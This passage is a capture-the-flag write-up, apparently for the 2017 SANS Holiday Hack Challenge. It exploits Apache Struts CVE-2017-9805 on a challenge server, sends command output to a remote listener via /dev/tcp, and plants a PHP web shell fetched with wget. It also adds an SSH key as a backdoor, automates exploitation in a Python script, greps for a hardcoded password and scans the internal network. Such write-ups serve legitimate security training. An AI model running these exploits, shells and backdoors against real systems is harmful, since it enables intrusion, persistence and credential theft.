<i>For hints associated with this challenge, Sparkle Redberry in the Winconceivable: The Cliffs of Winsanity Level can provide some tips.</i>
</p>
</div>
</div>

<div id="outline-container-orgcf1ccc1" class="outline-4">
<h4 id="q2_background-information"><a id="orgcf1ccc1"></a>Background Information</h4>
<div class="outline-text-4" id="text-q2_background-information">
<p>
We know that there is an application on <code>https://l2s.northpolechristmastown.com</code> that we need to investigate.
This webpage is publically accessible from the Internet and not appear to require any special measures to
access it. We do not know Alabaster password or username at the start of this challenge nor what type of
web service is running on the host.
</p>

<p>
The following hints were provided by Sparkle Redberry from completing the level
<a href="https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7">Winconceivable: The Cliffs of Winsanity</a>:
</p>
<ol class="org-ol">
<li>We're excited to debut the new Letters to Santa site this year. Alabaster worked hard on that project for over a year. I got to work with the development version of the site early on in the project lifecycle.</li>
<li>Near the end of the development we had to rush a few things to get the new site moved to production. Some development content on the letter page should probably have been removed, but ended up marked as hidden to avoid added change control paperwork.</li>
<li>Alabaster's primary backend experience is with Apache Struts. I love Apache and have a local instance set up on my home computer with a web shell. Web shells are great as a backdoor for me to access my system remotely. I just choose a really long complex file name so that no one else knows how to access it.</li>
<li>A simple web shell is to create a PHP file in the web root with <code>&lt;?php echo "&lt;pre&gt;" . shell_exec($_GET['e']) . "&lt;/pre&gt;"; ?&gt;</code>. Then, I visit the URL with my commands. For example, <code>http://server/complexFileName.php?e=ls</code>.</li>
<li>There are lots of different web shell tools available. <a href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">You can get a simple PHP web shell that is easy to use here</a>.</li>
<li>That business with Equal-Facts Inc was really unfortunate. I understand there are a lot of different exploits available for those vulnerable systems. Fortunately, Alabaster said he tested for CVE-2017-5638 and it was NOT vulnerable. Hope he checked the others too.</li>
<li>Apache Struts uses XML. I always had problems making proper XML formatting because of special characters. I either had to encode my data or escape the characters properly so the XML wouldn't break. I actually just checked and there are lots of different exploits out there for vulnerable systems. <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">Here is a useful article</a>.</li>
<li>Pro developer tip: Sometimes developers hard code credentials into their development files. Never do this, or at least make sure you take them out before publishing them or putting them into production. You also should avoid reusing credentials for different services, even on the same system.</li>
</ol>

<p>
The following SANS Pentest Blog posts were also very helpful for this challenge:
</p>
<ul class="org-ul">
<li><p>
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">Why You Need the Skills to Tinker with Publicly Released Exploit Code</a>
</p>

<p>
Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
</p></li>
<li><a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee%20Restricted">A Spot of Tee</a>
bash shell, and bypassing the I/O restriction with tee</li>
</ul>
</div>
</div>

<div id="outline-container-orgfda550b" class="outline-4">
<h4 id="q2_goal"><a id="orgfda550b"></a>Goal</h4>
<div class="outline-text-4" id="text-q2_goal">
<p>
There are two goals for this challenge. The first is to determine the topic of
the Great Book Page that is sitting on the web root of this server. The second
is to determine what Alabaster's password is.
</p>
</div>
</div>

<div id="outline-container-orgb021a59" class="outline-4">
<h4 id="q2_approach"><a id="orgb021a59"></a>Approach</h4>
<div class="outline-text-4" id="text-q2_approach">
<p>
According to the second hint there might be development code left in the production code.
If we look at the source of <code>l2s</code> the following code pops out.
</p>

<div class="org-src-container">
<pre class="src src-html"><span style="color: #969896; font-style: italic;">&lt;!-- </span><span style="color: #969896; font-style: italic;">Development version </span><span style="color: #969896; font-style: italic;">--&gt;</span>
&lt;<span style="color: #de935f;">a</span> <span style="color: #f0c674;">href</span>=<span style="color: #8abeb7;">"http://dev.northpolechristmastown.com"</span> <span style="color: #f0c674;">style</span>=<span style="color: #8abeb7;">"display: none;"</span>&gt;Access Development Version&lt;/<span style="color: #de935f;">a</span>&gt;
</pre>
</div>

<p>
Let's do some recon on the hosts:
</p>

<pre class="example">
$ nmap -sC l2s.northpolechristmastown.com

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-03 15:36 CST
Nmap scan report for l2s.northpolechristmastown.com (35.185.84.51)
Host is up (0.027s latency).
rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 996 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open   http
|_http-title: Did not follow redirect to https://l2s.northpolechristmastown.com/
443/tcp  open   https
|_http-title: Toys List
| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Not valid before: 2017-11-29T12:54:54
|_Not valid after:  2018-02-27T12:54:54
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 7.04 seconds
</pre>

<p>
In addition to the hidden link for dev.northpolechristmastown.com, it is also
present as an alternate name on the certificate of the host. Let's let nmap's
scripts scan that as well.
</p>

<pre class="example">
$ nmap -sC dev.northpolechristmastown.com

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-03 15:36 CST
Nmap scan report for dev.northpolechristmastown.com (35.185.84.51)
Host is up (0.028s latency).
rDNS record for 35.185.84.51: 51.84.185.35.bc.googleusercontent.com
Not shown: 996 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open   http
|_http-title: Did not follow redirect to https://dev.northpolechristmastown.com/
443/tcp  open   https
| http-title: Toys List
|_Requested resource was /orders.xhtml
| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Not valid before: 2017-11-29T12:54:54
|_Not valid after:  2018-02-27T12:54:54
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
3389/tcp closed ms-wbt-server
</pre>

<p>
We can see that dev and l2s are one in the same. Visiting the dev page has a footer
that simply states <code>Powered By: Apache Struts</code>. Let's use this to our advantage.
Let's use the tool provided through the SANS Pentest blog,
<a href="https://github.com/chrisjd20/cve-2017-9805.py">cve-2017-9805.py</a>. The dev page
we land on is <a href="https://dev.northpolechristmastown.com/orders.xhtml">https://dev.northpolechristmastown.com/orders.xhtml</a> so we'll use
that to start from.
</p>

<p>
Let's check out the help:
</p>

<pre class="example">
$ ./cve-2017-9805.py
usage: cve-2017-9805.py [-h] [-u URL] -c COMMAND

optional arguments:
  -h, --help  show this help message and exit
  -u URL      url of target vulnerable apache struts server. Ex-
	      http://somevulnstrutsserver.com/orders.xhtml
  -c COMMAND  command to execute against the target. Ex - /usr/bin/whoami
</pre>

<p>
The example URL is <code>http://somevulnstrutsserver.com/orders.xhtml</code>. How fortituous!
</p>

<pre class="example">
$ python cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 'ls'
[+] Encoding Command
[+] Building XML object
[+] Placing command in XML object
[+] Converting Back to String
[+] Making Post Request with our payload
[+] Payload executed
</pre>

<p>
Looks like we need to modify the program to let us see what it's
doing by uncommenting the following line:
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #b5bd68;">print</span> request.text
</pre>
</div>

<p>
Performing the same simple command above results in a lengthy Apache Tomcat
error with no apparent output from our <code>ls</code> command. We're dealing with a
blind injection so we'll need to figure out a different way to get the output
of the command. One trick we can pull is redirecting output to a special
pseudo device, <code>/dev/tcp/$host/$port</code>. First we'll need to set up a listener
on our end first:
</p>

<pre class="example">
holiday@hack:~$ nc -l -p 8888
</pre>

<p>
Now we run the exploit again:
</p>

<pre class="example">
./cve-2017-9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c "ls &gt; /dev/tcp/1.2.3.4/8888"
</pre>

<p>
The result on our end is:
</p>
<pre class="example">
holiday@hack:~$ nc -l -p 8888
bin
boot
dev
etc
home
...
vmlinuz
vmlinuz.old
</pre>

<p>
It looks like we've been dropped into the root directory. Let's look for
where the web root is. Normally, the default is /var/www/html on most
linux+apache based hosts. We'll try again with the command <code>ls -al /var/www/html</code>.
</p>

<pre class="example">
total 1772
drwxrwxrwt 6 www-data           www-data              4096 Jan  6 03:00 .
drwxr-xr-x 3 root               root                  4096 Oct 12 14:35 ..
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:03 css
drwxr-xr-x 3 root               www-data              4096 Oct 12 19:40 fonts
-r--r--r-- 1 root               www-data           1764298 Dec  4 20:25 GreatBookPage2.pdf
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:14 imgs
-rw-r--r-- 1 root               www-data             14501 Nov 24 20:53 index.html
drwxr-xr-x 2 root               www-data              4096 Oct 12 19:11 js
-rwx------ 1 www-data           www-data               231 Oct 12 21:25 process.php
</pre>

<p>
Oh look. There's <a href="https://l2s.northpolechristmastown.com/GreatBookPage2.pdf">GreatBookPage2.pdf</a>. We can download it and find the answer to the first question.
</p>

<p>
Let's assume for a minute that we didn't know where the web root
was. Since page 1 of our Great Book was a PDF, it's a pretty safe bet
that page 2 is also a PDF. It takes about half of a second to search the system for all PDFs using <code>find</code>:
</p>

<pre class="example">
$ find / -name *.pdf
/var/www/html/GreatBookPage2.pdf
</pre>
</div>

<ul class="org-ul">
<li><a id="org5a5aa14"></a>Command Execution<br />
<div class="outline-text-6" id="text-org5a5aa14">
<p>
It looks like we found our web root. Let's try out the
web shell they suggest in the hints from Josh Wright
<a href="https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php">easy-simple-php-webshell.php</a>.
We'll output it to a random file in the web root then
we can try to use it to execute commands using a browser.
</p>

<pre class="example">
./cve-2017-9805.py -c "wget -O /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php
   https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/be4b2c021b284f21418f55b9d4496cdd3b3c86d8/easy-simple-php-webshell.php"
   -u https://dev.northpolechristmastown.com/orders.xhtml
</pre>

<p>
Now we can access
<a href="https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php">https://l2s.northpolechristmastown.com/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php</a>
and look around. If we do an <code>ls</code> in this webshell, it just returns
the local directory, <code>/var/www/html</code>. Nothing in here suggests that we
have the webroot for the dev server,
<a href="https://dev.northpolechristmastown.com/">https://dev.northpolechristmastown.com/</a>.
</p>

<p>
Let's run <code>find</code> to see if we can find the password in our webshell.
</p>

<div class="org-src-container">
<pre class="src src-sh">find / -xdev -type f -user alabaster_snowball 2&gt;/dev/null | xargs grep password
</pre>
</div>

<p>
Within the page full of results we see this:
</p>

<pre class="example">
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String password = "stream_unhappy_buy_loss";
</pre>

<p>
A closer look at <code>OrderMySql.class</code> using <code>cat /opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class</code> we find:
</p>

<div class="org-src-container">
<pre class="src src-java"><span style="color: #b5bd68;">final</span> <span style="color: #81a2be;">String</span> <span style="color: #f0c674;">username</span> = <span style="color: #8abeb7;">"alabaster_snowball"</span>;
<span style="color: #b5bd68;">final</span> <span style="color: #81a2be;">String</span> <span style="color: #f0c674;">password</span> = <span style="color: #8abeb7;">"stream_unhappy_buy_loss"</span>;
</pre>
</div>
</div>
</li>
</ul>
</div>

<div id="outline-container-org1709412" class="outline-4">
<h4 id="q2_solution"><a id="org1709412"></a>Solution</h4>
<div class="outline-text-4" id="text-q2_solution">
</div>

<ul class="org-ul">
<li><a id="orgcaea3cf"></a>What is the topic of The Great Book page available in the web root of the server?<br />
<div class="outline-text-6" id="text-orgcaea3cf">
<p>
Leveraging the Apache Struts vulnerability, we can run <code>ls</code> on the
common web root of <code>/var/www/html</code>, and get the filename of the page,
then download it via the web server. Opening it up, we see that the
topic is:
</p>

<blockquote>
<p>
On the Topic of Flying Animals
</p>
</blockquote>
</div>
</li>

<li><a id="orgf01dc69"></a>What is Alabaster Snowball’s password?<br />
<div class="outline-text-6" id="text-orgf01dc69">
<p>
The trick here is just finding the right file, and the password is in
cleartext in that file. We used <code>find</code> to <code>grep</code> all the files for
"password".
</p>

<blockquote>
<p>
<code>stream_unhappy_buy_loss</code>
</p>
</blockquote>
</div>
</li>
</ul>
</div>

<div id="outline-container-org98ad2eb" class="outline-4">
<h4 id="q2_alternatives"><a id="org98ad2eb"></a>Alternatives</h4>
<div class="outline-text-4" id="text-q2_alternatives">
</div>

<ul class="org-ul">
<li><a id="org596005a"></a>Add an authorized_key<br />
<div class="outline-text-6" id="text-org596005a">
<p>
One thing you can do if you don't have the password yet is actually
add an ssh key to alabaster's authorized keys file. This is
problematic since you need to know that the username is actually
<code>alabaster_snowball</code> first. Assuming you do, you can run the following
command to add your key to the file.
</p>

<p>
The command we want to run is the following, taking care not to clobber any existing authorized keys:
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b294bb;">cd</span> /home/alabaster_snowball
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Make the .ssh directory, if it doesn't exist</span>
mkdir .ssh
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">ssh is very picky about permissions, so lock this down:</span>
chmod 700 .ssh
<span style="color: #b294bb;">cd</span> .ssh

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Create the authorized_keys file, if it doesn't exist</span>
touch authorized_keys
<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">...and lock it down</span>
chmod 600 authorized_keys

<span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">Append our key</span>
<span style="color: #b294bb;">echo</span> ssh-rsa <span style="color: #f0c674;">VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo</span>= holiday@hack | 
  tee -a /home/alabaster_snowball/.ssh/authorized_keys
</pre>
</div>

<p>
For running this via the Struts exploit, we want this all as a
one-liner. Let's break this up into two parts: first, we'll create the
necessary directory and file, and ensure the permissions are correct,
then we'll add our key:
</p>

<div class="org-src-container">
<pre class="src src-sh">./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 
  <span style="color: #8abeb7;">'cd /home/alabaster_snowball; mkdir .ssh; chmod 700 .ssh; cd .ssh; touch authorized_keys; chmod 600 authorized_keys'</span>
./cve_2017_9805.py -u https://dev.northpolechristmastown.com/orders.xhtml -c 
  <span style="color: #8abeb7;">'echo ssh-rsa VGhpcyBpcyBub3QgcmVhbGx5IGFuIFJTQSBrZXksIGJ1dCBoZXksIHdobyByZWFsbHkgbG9va3MgYXQgYmFzZTY0IGFueXdheQo= holiday@hack | tee -a /home/alabaster_snowball/.ssh/authorized_keys'</span>
</pre>
</div>

<p>
Then you can ssh using your private key identity file.
</p>

<pre class="example">
holiday@hack:~$ ssh -i /home/holiday/.ssh/sans_2017 alabaster_snowball@l2s.northpolechristmastown.com
alabaster_snowball@l2s:/tmp/asnow.xq1pCkwT7LUy3iLl0AaBCc7D$ grep -A1 -R / -e alabaster_snowball
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String username = "alabaster_snowball";
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class- final String password = "stream_unhappy_buy_loss";
</pre>

<p>
Once in you are in a restricted shell but you can try to grep for
alabaster's password but a regular grep against the entire system will
take about 1 minute then you have to parse through the results.
</p>
</div>
</li>

<li><a id="orga783807"></a>Automate the webshell<br />
<div class="outline-text-6" id="text-orga783807">
<p>
We can automate dropping a webshell and creating a mini shell to query
it. Assuming we have <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a> in
the same directory we can create a script to automate exploitation and
give us a prompt to execute commands.
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/usr/bin/env python</span>
<span style="color: #b5bd68;">from</span> __future__ <span style="color: #b5bd68;">import</span> print_function

<span style="color: #b5bd68;">import</span> base64
<span style="color: #b5bd68;">import</span> requests
<span style="color: #b5bd68;">import</span> sys

<span style="color: #b5bd68;">from</span> cve_2017_9805 <span style="color: #b5bd68;">import</span> main <span style="color: #b5bd68;">as</span> struts_exploit

<span style="color: #f0c674;">VULNERABLE_ENDPOINT</span> = <span style="color: #8abeb7;">"https://dev.northpolechristmastown.com/orders.xhtml"</span>
<span style="color: #f0c674;">BASE_URL</span> = <span style="color: #8abeb7;">"https://l2s.northpolechristmastown.com/"</span>
<span style="color: #f0c674;">WEBSHELL</span> = <span style="color: #8abeb7;">"4beadb1e-5ddb-4636-98a4-c2dac0f79ab3.php"</span>
<span style="color: #f0c674;">WEBSHELL_PAYLOAD</span> = b<span style="color: #8abeb7;">'&lt;?php system($_GET[cmd]); ?&gt;\n'</span>
<span style="color: #f0c674;">WEBSHELL_PAYLOAD_ENCODED</span> = base64.encodestring(WEBSHELL_PAYLOAD).strip()

<span style="color: #969896; font-style: italic;">## </span><span style="color: #969896; font-style: italic;">Emulate this command:</span>
<span style="color: #969896; font-style: italic;">## </span><span style="color: #969896; font-style: italic;">/cve-2017-9805.py -c 'echo PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo= | </span>
<span style="color: #969896; font-style: italic;">##    </span><span style="color: #969896; font-style: italic;">base64 -d &gt; /var/www/html/4beadb1e-5ddb-4636-98a4-c2dac0f79ab0.php' -u https://dev.northpolechristmastown.com/orders.xhtml</span>
<span style="color: #f0c674;">EXPLOIT_COMMAND</span> = <span style="color: #8abeb7;">"echo {} | base64 -d &gt; /var/www/html/{}"</span>.<span style="color: #b294bb;">format</span>(WEBSHELL_PAYLOAD_ENCODED, WEBSHELL)

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">run_command</span>(command):
    <span style="color: #f0c674;">url</span> = BASE_URL + WEBSHELL
    <span style="color: #f0c674;">request</span> = requests.get(url, params={<span style="color: #8abeb7;">"cmd"</span>:command})
    <span style="color: #b5bd68;">if</span> request.status_code == 404:
        <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">None</span>
    <span style="color: #b5bd68;">return</span> request.text

<span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">Main function</span>
<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">setup</span>():
    <span style="color: #969896; font-style: italic;"># </span><span style="color: #969896; font-style: italic;">See if we can run the id command, and if so, we are good to go...</span>
    <span style="color: #f0c674;">out</span> = run_command(<span style="color: #8abeb7;">'id'</span>)
    <span style="color: #b5bd68;">if</span> out <span style="color: #b5bd68;">and</span> <span style="color: #8abeb7;">'uid='</span> <span style="color: #b5bd68;">in</span> out:
        <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">True</span>
    sys.stderr.write(<span style="color: #8abeb7;">"The webshell did not exist, re-exploiting.....\n"</span>)
    struts_exploit(VULNERABLE_ENDPOINT, EXPLOIT_COMMAND)
    <span style="color: #f0c674;">out</span> = run_command(<span style="color: #8abeb7;">'id'</span>)
    <span style="color: #b5bd68;">if</span> out <span style="color: #b5bd68;">and</span> <span style="color: #8abeb7;">'uid='</span> <span style="color: #b5bd68;">in</span> out:
        <span style="color: #b5bd68;">return</span> <span style="color: #81a2be;">True</span>
    sys.stderr.write(<span style="color: #8abeb7;">"The struts exploit/webshell failed :-(\n"</span>)
    sys.<span style="color: #81a2be;">exit</span>(1)

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">interactive</span>():
    setup()
    <span style="color: #b5bd68;">while</span> <span style="color: #81a2be;">True</span>:
        <span style="color: #b5bd68;">try</span>:
            <span style="color: #f0c674;">cmd</span> = <span style="color: #b294bb;">raw_input</span>(<span style="color: #8abeb7;">"www-data@l2s:$ "</span>)
        <span style="color: #b5bd68;">except</span> <span style="color: #81a2be;">EOFError</span>:
            <span style="color: #b5bd68;">print</span>()
            <span style="color: #b5bd68;">return</span>
        <span style="color: #b5bd68;">print</span>(run_command(cmd))

<span style="color: #b5bd68;">def</span> <span style="color: #de935f;">one_shot</span>(command):
    setup()
    <span style="color: #b5bd68;">print</span>(run_command(command))

<span style="color: #b5bd68;">if</span> <span style="color: #b294bb;">__name__</span> == <span style="color: #8abeb7;">"__main__"</span>:
    <span style="color: #b5bd68;">if</span> sys.argv[1:]:
        one_shot(<span style="color: #8abeb7;">' '</span>.join(sys.argv[1:]))
    <span style="color: #b5bd68;">else</span>:
        interactive()
</pre>
</div>

<p>
First we need to either rename <code>cve-2017-9805.py</code> to
<code>cve_2017_9805.py</code> or create a symlink so it can be properly imported
into our script. Then we can easily execute commands on l2s.
</p>

<pre class="example">
holiday@hack:~$ ./l2s.py id
The webshell did not exist, re-exploiting.....
[+] Encoding Command
[+] Building XML object
[+] Placing command in XML object
[+] Converting Back to String
[+] Making Post Request with our payload
[+] Payload executed
uid=33(www-data) gid=33(www-data) groups=33(www-data)

holiday@hack:~$ ./l2s.py uname -a
Linux hhc17-apache-struts1 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64 GNU/Linux

holiday@hack:~$ ./l2s.py
www-data@l2s:$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@l2s:$ uname -a
Linux hhc17-apache-struts1 4.9.0-5-amd64 #1 SMP Debian 4.9.65-3+deb9u2 (2018-01-04) x86_64 GNU/Linux
</pre>
</div>
</li>

<li><a id="orgc12e8b8"></a>Search even faster with ripgrep<br />
<div class="outline-text-6" id="text-orgc12e8b8">
<p>
Ripgrep is a super fast grep replacement written in rust. It does a
better job at filtering binary files, so we can run this command that
finishes in about a second.
</p>

<p>
The following steps create a folder for ripgrep and executes the
search.
</p>

<div class="org-src-container">
<pre class="src src-sh">www-data@l2s:$ mkdir /tmp/.rg
www-data@l2s:$ wget -q -O - https://github.com/BurntSushi/ripgrep/releases/download/0.7.1/ripgrep-0.7.1-x86_64-unknown-linux-musl.tar.gz | 
  tar xzf - -C /tmp/.rg/
www-data@l2s:$ find / -type f -xdev -user alabaster_snowball 2&gt;/dev/null | 
  xargs /tmp/.rg/ripgrep-0.7.1-x86_64-unknown-linux-musl/rg alabaster -A 1
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class: final String username = <span style="color: #8abeb7;">"alabaster_snowball"</span>;
/opt/apache-tomcat/webapps/ROOT/WEB-INF/classes/org/demo/rest/example/OrderMySql.class- final String password = <span style="color: #8abeb7;">"stream_unhappy_buy_loss"</span>;
</pre>
</div>
</div>
</li>
</ul>
</div>

<div id="outline-container-orgb4f192a" class="outline-4">
<h4 id="q2_common-pitfalls"><a id="orgb4f192a"></a>Common Pitfalls</h4>
<div class="outline-text-4" id="text-q2_common-pitfalls">
<p>
A common pitfall is the blind injection aspect of the Apache Struts exploit. There were a couple of ways around this:
</p>

<ul class="org-ul">
<li>Using the <code>/dev/tcp</code> trick like we did,</li>
<li>Redirect the output to <code>/var/www/html/$filename</code>, and then accessing that via the web interface,</li>
<li>Piping the output to <code>netcat</code>.</li>
</ul>

<p>
Finding the password was also tricky. Luckily, there weren't many
files on this system, so we could just <code>grep</code> everything, but another
option would've been to look for files that had been modified around
the time the system was installed.
</p>

<p>
Trying to compromise the l2s app itself was a dead end.  Once we have command
execution we can see that the process.php script is simply:
</p>

<div class="org-src-container">
<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span>
<span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">"first_name"</span>] &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">"age"</span>] &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">"state"</span>] &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">"city"</span>] &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">"toy"</span>] &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">"message"</span>] &amp;&amp; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">"sex"</span>]) {
    <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">"Letter has been sent to Santa!"</span>;
} <span style="color: #b5bd68;">else</span> {
    <span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">"Error missing parameters"</span>;
}
<span style="color: #81a2be;">?&gt;</span>
</pre>
</div>
</div>
</div>

<div id="outline-container-orgc92c36f" class="outline-4">
<h4 id="q2_about-the-challenge"><a id="orgc92c36f"></a>About the Challenge</h4>
<div class="outline-text-4" id="text-q2_about-the-challenge">
<p>
Initially the host has a couple of noticeable holes.
</p>

<ul class="org-ul">
<li>Apache server running as alabaster (eventually changed to www-data user)</li>
<li>Easy bypass of rbash by adding the '-t' flag and executing bash on ssh login (eventually rbash was forced through sshd_config)</li>
</ul>

<p>
The server itself housed two virtual web hosts, the Letter's to Santa application which ran PHP in nginx and the Development site which was run by Apache struts on a high port being redirected by nginx.
</p>
</div>
</div>

<div id="outline-container-orgdf3f7c6" class="outline-4">
<h4 id="orgdf3f7c6">Moving Foward</h4>
<div class="outline-text-4" id="text-orgdf3f7c6">
<p>
Now that we have a script to automate access to l2s let's run nmap to scan the internal network.
</p>

<pre class="example">
holiday@hack:~$ ./l2s.py "nmap -sC 10.142.0.*"

Starting Nmap 7.40 ( https://nmap.org ) at 2018-01-09 20:51 UTC
Nmap scan report for hhc17-l2s-proxy.c.holidayhack2017.internal (10.142.0.2)
Host is up (0.00018s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp   open  http
|_http-title: Did not follow redirect to https://hhc17-l2s-proxy.c.holidayhack2017.internal/
443/tcp  open  https
|_http-title: Toys List
| ssl-cert: Subject: commonName=dev.northpolechristmastown.com
| Subject Alternative Name: DNS:dev.northpolechristmastown.com, DNS:l2s.northpolechristmastown.com
| Not valid before: 2017-11-29T12:54:54
|_Not valid after:  2018-02-27T12:54:54
|_ssl-date: TLS randomness does not represent time
| tls-nextprotoneg:
|_  http/1.1
2222/tcp open  EtherNetIP-1

Nmap scan report for hhc17-apache-struts1.c.holidayhack2017.internal (10.142.0.3)
Host is up (0.00017s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey:
|   2048 81:aa:b0:de:e0:4a:b5:23:7e:e8:cd:14:f3:fa:e2:f3 (RSA)
|_  256 dc:0b:52:ab:43:87:59:7b:04:88:2d:5c:db:92:4f:ba (ECDSA)
80/tcp open  http
|_http-title: Toys List

Nmap scan report for mail.northpolechristmastown.com (10.142.0.5)
Host is up (0.00018s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey:
|   2048 a2:c4:67:fe:a2:d9:df:47:02:55:35:1a:f4:1b:b6:02 (RSA)
|_  256 9e:d4:01:d1:71:be:95:90:68:6e:ee:87:28:42:49:8e (ECDSA)
25/tcp   open  smtp
|_smtp-commands: mail.northpolechristmastown.com, PIPELINING, SIZE 10240000, ETRN, AUTH PLAIN LOGIN, AUTH=PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
80/tcp   open  http
| http-robots.txt: 1 disallowed entry
|_/cookie.txt
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
143/tcp  open  imap
|_imap-capabilities: more AUTH=PLAIN capabilities have OK Pre-login AUTH=LOGINA0001 ENABLE listed SASL-IR IDLE post-login LITERAL+ IMAP4rev1 LOGIN-REFERRALS ID
2525/tcp open  ms-v-worlds
3000/tcp open  ppp

Nmap scan report for edb.northpolechristmastown.com (10.142.0.6)
Host is up (0.00014s latency).
Not shown: 996 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
| ssh-hostkey:
|   2048 73:de:22:15:7b:53:13:85:a7:a5:8f:10:3a:5d:3b:3f (RSA)
|_  256 f5:d7:f3:5d:dc:7c:73:10:cc:f7:a4:c7:f0:d9:61:0c (ECDSA)
80/tcp   open     http
| http-robots.txt: 1 disallowed entry
|_/dev
| http-title: Site doesn't have a title (text/html; charset=utf-8).
